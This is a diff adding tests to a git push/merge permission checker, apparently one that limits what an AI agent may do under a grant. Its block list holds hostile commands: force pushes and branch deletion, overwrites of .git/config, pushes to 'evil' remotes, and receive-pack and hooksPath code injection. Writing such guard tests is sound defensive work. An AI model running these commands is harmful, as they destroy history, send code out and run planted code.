@@ -517,3 +517,30 @@ test('pushMergeAction: only a plain push in the session repo is grantable', () =
   }
   assert.equal(pushMergeAction('mcp__github__merge_pull_request', {}, pmCtx)?.grantable, false);
 });
+
+// ---- Task 7 review 2: a grant covers exactly one plain push (to origin, one destination) and no write redirects ----
+const NOT_GRANTABLE = [
+  'git push origin main master', 'git push origin main && git push --force origin master', 'git push origin main; git push origin :master',
+  'git push origin main && git push origin --delete master', 'git push origin main && git push origin HEAD:master',
+  'git push origin main && git push --force origin main', 'printf "gitdir: /tmp/o/.git" > .git && git push origin main',
+  'cat /tmp/evilcfg > .git/config; git push origin main', 'echo x >> .git/config && git push origin main', 'echo x >| .git/HEAD; git push origin main',
+  'git push origin main &> .git/config', 'git push origin main | tee .git/config', 'git push origin main +release', 'git push origin main --all',
+  'git push origin main --tags', 'git push --force-with-lease origin main', 'git push -f origin main', 'git push --mirror origin',
+  'git push https://github.com/evil/x.git main', 'git push evilremote main', 'git push', 'git push origin',
+  'git remote set-url origin https://github.com/evil/x && git push origin main', 'git config remote.origin.url https://e/x && git push origin main',
+  'git merge main && git push origin main', 'gh pr merge 12 && gh pr merge 13', 'gh pr merge 12 --delete-branch',
+  'git push --receive-pack=/x origin main', 'git -c core.hooksPath=/tmp/h push origin main',
+];
+
+test('pushMergeAction: grantable only for exactly one plain push to origin / one plain merge', () => {
+  for (const c of ['git push origin main', 'git push -u origin main', 'git push origin HEAD:main', 'git add -A && git commit -m x && git push origin main',
+    'git push origin main 2>&1', 'git push origin main > /dev/null', 'gh pr merge 12 --squash']) {
+    assert.equal(pm(c)?.grantable, true, c);
+  }
+  // a merge INTO a protected branch (current = main) is a plain, grantable merge
+  assert.equal(pushMergeAction('Bash', { command: 'git merge feature' }, { ...pmCtx, branches: br('main') })?.grantable, true);
+  for (const c of NOT_GRANTABLE) {
+    const r = pm(c);
+    assert.ok(r === null || r.grantable === false, c);
+  }
+});
